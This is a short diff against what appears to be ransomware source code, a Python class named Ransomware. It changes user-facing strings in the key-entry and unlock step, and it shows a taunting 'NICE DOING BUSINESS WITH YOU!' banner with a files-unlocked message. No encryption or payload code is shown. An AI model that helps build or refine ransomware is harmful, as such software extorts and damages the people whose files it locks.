@@ -86,7 +86,7 @@ class Ransomware:
                 mySecret.set_key(bytes(tiped_key, 'utf8'))
                 break
             except:
-                print("\nWrong key, try again...\n")
+                print("Wrong key, be careful...\n")
         
         # Listing txt files
         lfile = self.get_files('*.txt')
@@ -98,6 +98,7 @@ class Ransomware:
         print("\n\t\t+-+-+-+-+  +-+-+-+-+-+  +-+-+-+-+-+-+-+-+  +-+-+-+-+  +-+-+-++-+\n\
                 |N|I|C|E|  |D|O|I|N|G|  |B|U|S|I|N|E|S|S|  |W|I|T|H|  |Y|O|U||!|\n\
                 +-+-+-+-+  +-+-+-+-+-+  +-+-+-+-+-+-+-+-+  +-+-+-+-+  +-+-+-++-+\n")
+        print("- Your files have been unlocked -\n")
 
         return
 
